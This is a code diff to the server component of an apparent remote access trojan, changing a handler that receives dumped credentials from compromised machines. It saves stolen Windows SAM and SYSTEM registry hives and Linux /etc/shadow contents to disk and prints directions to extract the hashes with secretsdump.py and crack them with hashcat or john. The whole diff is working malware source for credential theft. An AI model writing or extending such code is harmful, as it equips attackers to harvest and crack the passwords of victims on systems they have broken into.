@@ -6,6 +6,7 @@ import ssl
 import json
 import datetime
 import time
+import base64
 from threading import Thread
 from utils.logger import setup_logger
 from rat.server._build_upload_payload import _build_upload_payload
@@ -342,19 +343,38 @@ class SSLServer:
     def _save_hashdump(self, response):
         try:
             lines = response.split("\n")
-            # Expected format: HASHDUMP / OK / SAM=... / SYSTEM=... / EOF
-            sam_b64 = lines[2].replace("SAM=", "")
-            sys_b64 = lines[3].replace("SYSTEM=", "")
-            sam_data = base64.b64decode(sam_b64)
-            sys_data = base64.b64decode(sys_b64)
+            # lines[0] = "HASHDUMP", lines[1] = "OK", lines[2] = "TEXT" or "SAM=..."
+            content_type = lines[2]
+
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            with open(f"sam_{timestamp}.hive", "wb") as f:
-                f.write(sam_data)
-            with open(f"system_{timestamp}.hive", "wb") as f:
-                f.write(sys_data)
-            print(f"Hives saved: sam_{timestamp}.hive, system_{timestamp}.hive")
-            print("Extract hashes with:")
-            print(f"secretsdump.py -sam sam_{timestamp}.hive -system system_{timestamp}.hive LOCAL")
+
+            if content_type.startswith("SAM="):
+                # Windows: base64-encoded hives
+                sam_b64 = lines[2].replace("SAM=", "")
+                sys_b64 = lines[3].replace("SYSTEM=", "")
+                sam_data = base64.b64decode(sam_b64)
+                sys_data = base64.b64decode(sys_b64)
+                with open(f"sam_{timestamp}.hive", "wb") as f:
+                    f.write(sam_data)
+                with open(f"system_{timestamp}.hive", "wb") as f:
+                    f.write(sys_data)
+                print(f"Hives saved: sam_{timestamp}.hive, system_{timestamp}.hive")
+                print("Extract hashes with:")
+                print(f"secretsdump.py -sam sam_{timestamp}.hive -system system_{timestamp}.hive LOCAL")
+
+            elif content_type == "TEXT":
+                # Linux /etc/shadow content (plain text)
+                # The actual lines start from index 3 to -1 (excluding "EOF")
+                shadow_lines = lines[3:-1]  # drop "EOF" at the end
+                content = "\n".join(shadow_lines)
+                filename = f"shadow_{timestamp}.txt"
+                with open(filename, "w") as f:
+                    f.write(content)
+                print(f"Shadow file saved: {filename}")
+                print("Use hashcat / john to crack the hashes.")
+            else:
+                print("Unknown hashdump format:", response)
+
         except Exception as e:
             print("Hashdump save error:", e)
 
